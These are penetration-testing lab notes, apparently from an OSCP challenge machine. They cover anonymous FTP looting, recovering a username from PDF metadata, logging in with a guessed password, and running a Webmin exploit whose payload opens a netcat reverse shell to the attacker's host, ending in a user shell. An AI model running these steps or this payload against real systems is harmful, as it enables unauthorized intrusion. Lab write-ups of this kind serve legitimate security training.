FTP

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/ChallengeLab/OSCP_C/Charlie\]

└─$  ftp 192.168.202.157

Connected to 192.168.202.157.

220 (vsFTPd 3.0.5)

Name (192.168.202.157:kali): anonymous

331 Please specify the password.

Password:

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

229 Entering Extended Passive Mode (|||10100|)

150 Here comes the directory listing.

drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup

226 Directory send OK.

ftp> mget backup

ftp: Unable to determine real path of \`backup': No such file or directory

Skipping non-relative filename \`backup/BROCHURE-TEMPLATE.pdf'

ftp: Unable to determine real path of \`backup': No such file or directory

Skipping non-relative filename \`backup/CALENDAR-TEMPLATE.pdf'

ftp: Unable to determine real path of \`backup': No such file or directory

Skipping non-relative filename \`backup/FUNCTION-TEMPLATE.pdf'

ftp: Unable to determine real path of \`backup': No such file or directory

Skipping non-relative filename \`backup/NEWSLETTER-TEMPLATE.pdf'

ftp: Unable to determine real path of \`backup': No such file or directory

Skipping non-relative filename \`backup/REPORT-TEMPLATE.pdf'

ftp> cd backup

250 Directory successfully changed.

ftp> ls

229 Entering Extended Passive Mode (|||10094|)

150 Here comes the directory listing.

-rw-r--r--    1 114      120        145831 Nov 02  2022 BROCHURE-TEMPLATE.pdf

-rw-r--r--    1 114      120        159765 Nov 02  2022 CALENDAR-TEMPLATE.pdf

-rw-r--r--    1 114      120        336971 Nov 02  2022 FUNCTION-TEMPLATE.pdf

-rw-r--r--    1 114      120        739052 Nov 02  2022 NEWSLETTER-TEMPLATE.pdf

-rw-r--r--    1 114      120        888653 Nov 02  2022 REPORT-TEMPLATE.pdf

226 Directory send OK.

ftp> mget *

mget BROCHURE-TEMPLATE.pdf \[anpqy?\]? y

229 Entering Extended Passive Mode (|||10097|)

150 Opening BINARY mode data connection for BROCHURE-TEMPLATE.pdf (145831 bytes).

100% |***************************************************************************************************************|   142 KiB  562.61 KiB/s    00:00 ETA

226 Transfer complete.

145831 bytes received in 00:00 (420.10 KiB/s)

mget CALENDAR-TEMPLATE.pdf \[anpqy?\]? y

229 Entering Extended Passive Mode (|||10099|)

150 Opening BINARY mode data connection for CALENDAR-TEMPLATE.pdf (159765 bytes).

100% |***************************************************************************************************************|   156 KiB  608.13 KiB/s    00:00 ETA

226 Transfer complete.

159765 bytes received in 00:00 (457.25 KiB/s)

mget FUNCTION-TEMPLATE.pdf \[anpqy?\]? y

229 Entering Extended Passive Mode (|||10093|)

150 Opening BINARY mode data connection for FUNCTION-TEMPLATE.pdf (336971 bytes).

100% |***************************************************************************************************************|   329 KiB  779.56 KiB/s    00:00 ETA

226 Transfer complete.

336971 bytes received in 00:00 (646.92 KiB/s)

mget NEWSLETTER-TEMPLATE.pdf \[anpqy?\]? y

229 Entering Extended Passive Mode (|||10094|)

150 Opening BINARY mode data connection for NEWSLETTER-TEMPLATE.pdf (739052 bytes).

100% |***************************************************************************************************************|   721 KiB    1.05 MiB/s    00:00 ETA

226 Transfer complete.

739052 bytes received in 00:00 (961.54 KiB/s)

mget REPORT-TEMPLATE.pdf \[anpqy?\]? y

229 Entering Extended Passive Mode (|||10098|)

150 Opening BINARY mode data connection for REPORT-TEMPLATE.pdf (888653 bytes).

100% |***************************************************************************************************************|   867 KiB    1.11 MiB/s    00:00 ETA

226 Transfer complete.

888653 bytes received in 00:00 (1.00 MiB/s)

ftp> exit

221 Goodbye.

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/ChallengeLab/OSCP_C/Charlie\]

└─$ exiftool FUNCTION-TEMPLATE.pdf

ExifTool Version Number         : 13.25

File Name                       : FUNCTION-TEMPLATE.pdf

Directory                       : .

File Size                       : 337 kB

File Modification Date/Time     : 2022:11:02 18:38:03+09:00

File Access Date/Time           : 2025:11:10 22:49:35+09:00

File Inode Change Date/Time     : 2025:11:10 22:49:35+09:00

File Permissions                : -rw-rw-r--

File Type                       : PDF

File Type Extension             : pdf

MIME Type                       : application/pdf

PDF Version                     : 1.5

Linearized                      : No

Page Count                      : 1

Language                        : en-US

Tagged PDF                      : Yes

Author                          : Cassie

Creator                         : Microsoft® Word 2016

Create Date                     : 2022:11:02 11:38:02+02:00

Modify Date                     : 2022:11:02 11:38:02+02:00

Producer                        : Microsoft® Word 2016

![[wt-initial image.png]]

Web 20000

![[wt-initial image 1.png]]

![[wt-initial image 2.png]]

cassie:cassie

![[wt-initial image 3.png]]

cassie:cassieの認証でログインできることを確認

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/ChallengeLab/OSCP_C/Charlie\]

└─$ python3 50234.py -u 192.168.202.157 -l cassie -p cassie

/home/kali/OffSec/PEN-200_OSCP+/ChallengeLab/OSCP_C/Charlie/50234.py:82: SyntaxWarning: invalid escape sequence '\?'

last_gets_key = re.findall("edit_key.cgi\?(.*?)'",str(key_list.content))\[-2\]

\[+\] Target https://192.168.202.157:20000

\[+\] Login successfully

\[+\] Setup GnuPG

\[+\] Payload {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 443 >/tmp/f;echo "', 'email': '1337@webmin.com'}

\[+\] Setup successful

\[+\] Fetching key list

\[+\] Key : idx=1\

Traceback (most recent call last):

![[wt-initial image 4.png]]

┌──(kali㉿kali)-\[~/…/PEN-200_OSCP+/ChallengeLab/OSCP_C/Charlie\]

└─$ rlwrap -cAr nc -lvnp 443

listening on \[any\] 443 ...

connect to \[192.168.45.238\] from (UNKNOWN) \[192.168.202.157\] 51086

sh: cannot set terminal process group (1019): Inappropriate ioctl for device

sh: no job control in this shell

sh-5.1$ id

id

uid=1000(cassie) gid=1000(cassie) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)

![[wt-initial image 5.png]]